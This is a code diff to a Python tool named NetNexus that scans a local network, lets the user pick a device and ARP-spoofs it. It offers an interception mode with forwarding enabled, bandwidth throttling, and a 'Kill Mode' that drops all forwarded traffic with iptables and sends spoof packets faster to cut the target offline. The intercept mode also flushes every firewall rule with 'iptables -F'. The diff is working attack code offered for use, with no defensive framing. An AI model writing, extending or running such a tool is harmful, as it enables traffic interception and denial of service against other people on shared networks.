@@ -6,8 +6,19 @@ import subprocess
 from core import scanner, spoof
 
 def set_forwarding(state):
-    val = "1" if state else "0"
-    subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)
+    """
+    state=True: Intercept Mode (Forwarding ON)
+    state=False: Kill Mode (Forwarding OFF + IPTables DROP)
+    """
+    if state:
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
+        # Flush rules to allow traffic again
+        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
+        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
+    else:
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
+        # Force the kernel to drop all packets being routed through you
+        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "DROP"], capture_output=True)
 
 def set_limit(interface, speed):
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
@@ -22,13 +33,11 @@ def clear_limit(interface):
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
 
 def main():
-    print("[*] NetNexus Initializing...")
-    # Update this name to your actual interface (ip a)
-    iface = "wlan0" 
+    iface = "wlan0" # Verify with 'ip a'
     scapy.conf.iface = iface
     
     if os.geteuid() != 0:
-        print("[-] Error: You must run this with sudo!")
+        print("[-] NetNexus requires root. Use: sudo python main.py")
         return
 
     gateway_ip = "192.168.8.1"
@@ -37,15 +46,11 @@ def main():
 
     while True:
         print("\n" + "="*45)
-        print("      NetNexus: Discovery & Control")
+        print("      NetNexus: Ultimate Control Build")
         print("="*45)
         
-        # Scan and update persistent memory
         device_memory = scanner.scan(ip_range, device_memory)
         current_list = list(device_memory.values())
-        
-        if not current_list:
-            print("[!] No devices found. Check your interface or network.")
         
         for index, dev in enumerate(current_list):
             print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
@@ -67,6 +72,8 @@ def main():
             print("[*] Resolving Gateway...")
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
 
+            # Execution Logic
+            wait_time = 0.5
             if mode == "1":
                 set_forwarding(True)
                 clear_limit(iface)
@@ -77,16 +84,17 @@ def main():
             elif mode == "3":
                 set_forwarding(False)
                 clear_limit(iface)
+                wait_time = 0.1 # Spam faster in Kill Mode
 
-            print(f"[*] Attack Active on {target_ip}. Ctrl+C to stop.")
+            print(f"[*] Attack Active on {target_ip} ({target_mac})...")
             while True:
                 spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
-                time.sleep(0.5) 
+                time.sleep(wait_time) 
                 
         except (ValueError, IndexError):
-            print("[-] Invalid ID selected.")
+            print("[-] Invalid Selection.")
         except KeyboardInterrupt:
-            print("\n[*] Stopping... Cleaning up settings.")
+            print("\n[*] Cleaning up system...")
             set_forwarding(True)
             clear_limit(iface)
             spoof.restore(target_ip, gateway_ip)
